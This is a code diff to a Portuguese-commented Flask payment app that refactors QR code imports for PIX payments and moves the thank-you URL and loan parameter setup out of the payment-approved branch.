@@ -5,6 +5,7 @@ from flask import Flask, render_template, request, jsonify, redirect, url_for, s
 import logging
 import secrets
 import qrcode
+import qrcode.constants
 import base64
 from io import BytesIO
 import re
@@ -452,9 +453,13 @@ def generate_random_phone():
     return f"{ddd}{number}"
 
 def generate_qr_code(pix_code: str) -> str:
+    # Importar o QRCode dentro da função para garantir que a biblioteca está disponível
+    import qrcode
+    from qrcode import constants
+    
     qr = qrcode.QRCode(
         version=1,
-        error_correction=qrcode.constants.ERROR_CORRECT_L,
+        error_correction=constants.ERROR_CORRECT_L,
         box_size=10,
         border=4,
     )
@@ -549,6 +554,9 @@ def payment():
         # Garantir que temos valores válidos
         if not qr_code:
             # Gerar QR code com biblioteca qrcode
+            import qrcode
+            import qrcode
+            from qrcode import constants
             qr = qrcode.QRCode(version=1, box_size=10, border=5)
             qr.add_data(pix_code)
             qr.make(fit=True)
@@ -697,16 +705,16 @@ def check_payment_status(transaction_id):
         is_completed = status_data.get('status') == 'completed'
         is_approved = status_data.get('original_status') in ['APPROVED', 'PAID']
         
+        # Construir o URL personalizado para a página de agradecimento (sempre criar, independentemente do status)
+        thank_you_url = request.url_root.rstrip('/') + '/obrigado'
+        
+        # Obter dados adicionais (banco, chave PIX e valor do empréstimo)
+        bank = request.args.get('bank', 'Caixa Econômica Federal')
+        pix_key = request.args.get('pix_key', cpf if cpf else '')
+        loan_amount = request.args.get('loan_amount', '4000')
+        
         if is_completed or is_approved:
             app.logger.info(f"[PROD] PAGAMENTO APROVADO: {transaction_id} - Status: {status_data.get('status')}, Original Status: {status_data.get('original_status')}")
-            
-            # Construir o URL personalizado para a página de agradecimento
-            thank_you_url = request.url_root.rstrip('/') + '/obrigado'
-            
-            # Obter dados adicionais (banco, chave PIX e valor do empréstimo)
-            bank = request.args.get('bank', 'Caixa Econômica Federal')
-            pix_key = request.args.get('pix_key', cpf if cpf else '')
-            loan_amount = request.args.get('loan_amount', '4000')
             
             # Adicionar parâmetros do usuário, se disponíveis
             params = {
@@ -778,7 +786,11 @@ def check_payment_status(transaction_id):
         
         # Adicionar informações extras ao status para o frontend
         status_data['phone_provided'] = bool(phone)
-        status_data['thank_you_url'] = thank_you_url if (is_completed or is_approved) else None
+        # Como thank_you_url é sempre definido agora, podemos simplificar a lógica
+        if is_completed or is_approved:
+            status_data['thank_you_url'] = thank_you_url
+        else:
+            status_data['thank_you_url'] = None
         
         return jsonify(status_data)
     except Exception as e:
